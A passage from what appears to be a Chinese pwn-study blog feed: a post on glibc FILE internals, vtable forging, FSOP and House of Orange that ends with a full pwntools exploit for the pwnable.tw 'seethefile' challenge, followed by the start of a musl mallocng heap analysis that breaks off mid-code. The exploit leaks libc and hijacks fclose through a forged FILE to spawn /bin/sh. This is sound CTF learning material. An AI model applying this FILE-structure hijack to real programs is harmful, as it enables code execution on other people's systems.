addr_binsh</li></ul><p>在理想的堆风水情况下，只需要任意写一次，即可通过 <code>exit()</code> 拿到 shell</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;持续更新（或许）&lt;/p&gt;</summary>
    
    
    
    <category term="Exploration" scheme="https://humoooor.cn/categories/Exploration/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>FILE Exploration</title>
    <link href="https://humoooor.cn/2022/10/11/FILE%20Exploration/"/>
    <id>https://humoooor.cn/2022/10/11/FILE%20Exploration/</id>
    <published>2022-10-11T03:15:00.000Z</published>
    <updated>2023-03-31T08:10:16.338Z</updated>
    
    <content type="html"><![CDATA[<p>系统地学一下 glibc 文件结构的洞</p><span id="more"></span><h2 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h2><figure class="highlight c"><figcaption><span>./libio/libio.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>_IO_FILE<ul><li>_flags<ul><li>记录文件流的属性<ul><li>Read only</li><li>Append</li><li>…</li></ul></li></ul></li><li>Stream buffer<ul><li>Read buffer<ul><li>_IO_read_ptr</li><li>_IO_read_end</li><li>_IO_read_base</li></ul></li><li>Write buffer<ul><li>_IO_write_ptr</li><li>_IO_write_end</li><li>_IO_write_base</li></ul></li><li>Reserve buffer<ul><li>_IO_buf_base</li><li>_IO_buf_end</li></ul></li></ul></li><li>_fileno<ul><li>文件描述符</li></ul></li><li>_chain<ul><li>FILE 结构体是一个尾插法单向链表，默认有 stderr -&gt; stdout -&gt; stdin</li></ul></li><li>_lock<ul><li>避免多线程的条件竞争</li><li>在攻击时通常需要构造它<ul><li>使其指向一个全是0的空间</li></ul></li></ul></li></ul></li><li>_IO_FILE_plus<ul><li>stdin/stdout/stderr/fopen 使用这个结构体</li><li>_IO_FILE</li><li>vtable<ul><li>所有对文件的操作都是通过 vtable</li></ul></li></ul></li></ul><h2 id="fopen-流程"><a href="#fopen-流程" class="headerlink" title="fopen 流程"></a>fopen 流程</h2><ol><li>分配 FILE 结构体空间<ul><li>malloc</li></ul></li><li>初始化 FILE 结构体<ul><li>_IO_new_file_init_internal</li></ul></li><li>把 FILE 结构体放入链表<ul><li>_IO_link_in</li></ul></li><li>打开文件<ul><li>_IO_new_file_open</li><li>sys_open</li></ul></li></ol><h2 id="fread-流程"><a href="#fread-流程" class="headerlink" title="fread 流程"></a>fread 流程</h2><ol><li>如果 stream buffer 是空的<ul><li>vtable -&gt; _IO_file_xsgetn</li><li>分配 buffer<ul><li>vtable -&gt; _IO_file_doallocate</li></ul></li></ul></li><li>读取数据到 stream buffer 中<ul><li>vtable -&gt; _IO_file_underflow</li></ul></li><li>把数据从 stream buffer 复制到目的地址<ul><li>sys_read</li></ul></li></ol><h2 id="fwrite-流程"><a href="#fwrite-流程" class="headerlink" title="fwrite 流程"></a>fwrite 流程</h2><ol><li>如果 steam buffer 是空的<ul><li>vtable -&gt; _IO_file_xsputn</li><li>分配 buffer<ul><li>vtable -&gt; _IO_file_doallocate</li></ul></li></ul></li><li>复制用户数据到 stream buffer</li><li>如果 stream buffer 满了或者要刷新 steam buffer，将 steam buffer 的数据写入文件<ul><li>sys_write</li></ul></li></ol><h2 id="fclose-流程"><a href="#fclose-流程" class="headerlink" title="fclose 流程"></a>fclose 流程</h2><ol><li>把 FILE 结构从链表中移除<ul><li>_IO_unlink_it</li></ul></li><li>刷新并释放 stream buffer<ul><li>_IO_new_file_close_it</li><li>_IO_do_flush</li></ul></li><li>关闭文件<ul><li>sys_close</li></ul></li><li>释放 FILE 结构<ul><li>vtable -&gt; _IO_file_finish</li><li>free</li></ul></li></ol><h2 id="伪造-vtable"><a href="#伪造-vtable" class="headerlink" title="伪造 vtable"></a>伪造 vtable</h2><p>伪造 FILE 结构，将 vtable 指向构造的函数</p><ol><li>修改 _lock 指向一个全为 0 的内存</li><li>找到 vtable 的偏移</li><li>修改 vtable 指向可控的内存</li><li>调试查看 close 时会 call 的位置和 rdi 参数</li><li>将对应位置改成 system 和 /bin/sh</li></ol><p>注：一般 rdi 的值为 _flags + 后面四个字节，所以一般前 8 个字节设置为 <code>AAAA;sh;</code></p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>File-Stream Oriented Programming</p><ul><li><p>控制文件结构链表</p><ul><li>_chain</li><li>_IO_list_all 全局变量，链表头</li></ul></li><li><p>IO_flush_all_lockp</p><ul><li>用于刷新所有 FILE 的缓存</li><li>调用条件<ul><li>当 libc 执行 abort 时</li><li>当执行 exit 时</li><li>当从 main 返回时</li></ul></li><li>在调用时，如果 <code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 会调用 <code>vtable-&gt;_IO_overflow</code></li></ul></li></ul><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><ul><li>利用 Unsorted bin attack 把 unsorted bin 写到 _IO_list_all</li><li>构造 0x60 大小的 chunk 放入 small bin</li><li>调用 _IO_flush_all_lockp 有 50% 概率把 0x60 大小的 chunk 作为 FILE 结构造成 FSOP</li></ul><h2 id="Pwnable-seethefile"><a href="#Pwnable-seethefile" class="headerlink" title="Pwnable seethefile"></a>Pwnable seethefile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure><p>利用点</p><ul><li>读取 <code>/proc/self/maps</code> 得到 libc 地址</li><li>在 <code>case 5</code> 的时候 name 溢出覆盖 fp 到 fake_file，<code>fclose(fp)</code>时就可以使用伪造的 vtable</li></ul><p>主要需要调试找到 _lock、vtable 和调用 vtable 中的函数的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;chall.pwnable.tw:10200&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">p = remote(address[<span class="number">0</span>], address[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># p = process(__file__[0:-3])</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fopen</span>(<span class="params">filename</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fread</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fwrite</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln_exit</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">addr_fake_file = elf.sym[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">addr_fp = elf.sym[<span class="string">&quot;fp&quot;</span>]</span><br><span class="line">offset_fp = addr_fp - addr_fake_file</span><br><span class="line">offset_lock = <span class="number">0x48</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_vtable = <span class="number">0x94</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_call = <span class="number">0x44</span> <span class="comment"># addr_vtable + _</span></span><br><span class="line"></span><br><span class="line">fopen(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line"><span class="comment"># addr_libc = int(p.recv(8), 16)</span></span><br><span class="line">addr_libc = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) + <span class="number">0x1000</span></span><br><span class="line"><span class="comment"># info(&quot;libc addr =&gt; &quot; + hex(addr_libc))</span></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p32(addr_system) * <span class="number">6</span></span><br><span class="line">payload = (fake_file).ljust(offset_fp, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file)</span><br><span class="line">payload = (payload).ljust(offset_lock, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + offset_vtable + <span class="number">4</span>)</span><br><span class="line">payload = (payload).ljust(offset_vtable, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + <span class="number">8</span> - offset_call)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x8048b0f&quot;)</span></span><br><span class="line"></span><br><span class="line">vuln_exit(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;系统地学一下 glibc 文件结构的洞&lt;/p&gt;</summary>
    
    
    
    <category term="Exploration" scheme="https://humoooor.cn/categories/Exploration/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Musl heap 浅析</title>
    <link href="https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"/>
    <id>https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/</id>
    <published>2022-10-10T08:26:00.000Z</published>
    <updated>2023-03-31T08:10:43.582Z</updated>
    
    <content type="html"><![CDATA[<p>浅浅分析一下</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>环境：x64 musl-1.2.2</p><p>笔者只浅浅分析了 malloc 和 free 的源码，对相关结构没有详细介绍，可配合 xf1les 师傅的<a href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">文章</a>食用</p><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>实际上源码并没有 chunk 结构体定义，下面是通过 malloc 推测出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> prev_data[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> idx:<span class="number">5</span>;  <span class="comment">// group 的第几个 chunk，从 0 开始</span></span><br><span class="line">    <span class="type">uint8_t</span> reserved:<span class="number">3</span>; <span class="comment">// chunk 没有用到的空间大小，若 reserved = 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">// 相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10</span></span><br><span class="line">    <span class="type">char</span> data[]; <span class="comment">// 用户数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>prev_data</strong><ul><li>空间复用，前一个 chunk 可以多使用 4 个字节</li></ul></li><li><strong>idx</strong><ul><li>group 的第几个 chunk，从 0 开始</li></ul></li><li><strong>reserved</strong><ul><li>chunk 没有用到的空间大小</li><li>若 reserved == 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved</li></ul></li><li><strong>offset</strong><ul><li>相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10</li></ul></li></ul><p>由于内存对齐，每个 chunk 可以使用下一个 chunk 的 4 字节空间</p><p>（每个 group 的第一个 chunk 前面有 0x10 个字节 = group + chunk_header）</p><h4 id="inuse-chunk"><a href="#inuse-chunk" class="headerlink" title="inuse_chunk"></a>inuse_chunk</h4><p>avail_mask 和 freed_mask 对应的位置都为 0</p><h4 id="unuse-chunk"><a href="#unuse-chunk" class="headerlink" title="unuse_chunk"></a>unuse_chunk</h4><ul><li><p><strong>avail_chunk</strong></p><ul><li>内容一般为空</li><li>avail_mask 上 idx 对应的位置为 1</li></ul></li><li><p><strong>freed_chunk</strong></p><ul><li>idx 和 reserved 置为 0xff，offset 置零</li><li>freed_mask 上 idx 对应的位置为 1</li></ul></li></ul><h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// 对应的 meta 地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;<span class="comment">// last_chunk_idx</span></span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];   <span class="comment">// alien</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由 meta 管理，位于可执行文件的数据段</p><ul><li><strong>meta</strong><ul><li>对应的 meta 地址</li></ul></li><li><strong>active_idx</strong><ul><li>可用的 chunk 的最大 idx</li></ul></li><li><strong>pad</strong><ul><li>填充位，用于对齐</li></ul></li><li><strong>storage</strong><ul><li>存储数据，chunks</li></ul></li></ul><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">// 同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 指向对应的 group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;  <span class="comment">// 以位图方式表示 group 中 chunk 状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">// group 中 chunk 数量</span></span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// meta 是否可以被回收，1 表示可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// 作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte）</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>prev</strong>，<strong>next</strong><ul><li>同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接</li></ul></li><li><strong>mem</strong><ul><li>指向对应的 group 地址</li></ul></li><li><strong>avail_mask</strong>，<strong>freed_mask</strong><ul><li>以位图方式表示 group 中 chunk 状态，因此一个 group 最多能有 32 个 chunk</li><li>0 表示 inuse，1 表示 avail 或 freed</li><li>chunk 分为 inuse_chunk、avail_chunk、freed_chunk 三个状态</li></ul></li><li><strong>last_idx</strong><ul><li>group 中 chunk 数量</li></ul></li><li><strong>freeable</strong><ul><li>meta 是否可以被回收，1 表示可以</li></ul></li><li><strong>sizeclass</strong><ul><li>作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte）</li></ul></li></ul><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line"><span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line"><span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line"><span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line"><span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line"><span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line"><span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line"><span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line"><span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line"><span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>maplen</strong><ul><li>若 group 是 mmap 分配的空间，为对应的长度，其他情况为 0</li></ul></li></ul><h4 id="avail-meta"><a href="#avail-meta" class="headerlink" title="avail_meta"></a>avail_meta</h4><p>在 meta_area 中按顺序取出，avail_meta = {0}</p><h4 id="freed-meta"><a href="#freed-meta" class="headerlink" title="freed_meta"></a>freed_meta</h4><ul><li>FIFO，malloc_context 中 freed_meta_head 指向第一个 freed_meta</li><li>meta-&gt;mem-&gt;meta = 0</li><li>freed_meta = {0}</li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;<span class="comment">// 与 malloc_context 中的 secret 相等，防止伪造 meta</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// 下一个 meta_area 的地址</span></span><br><span class="line"><span class="type">int</span> nslots;<span class="comment">// meta 槽的数量</span></span><br><span class="line"><span 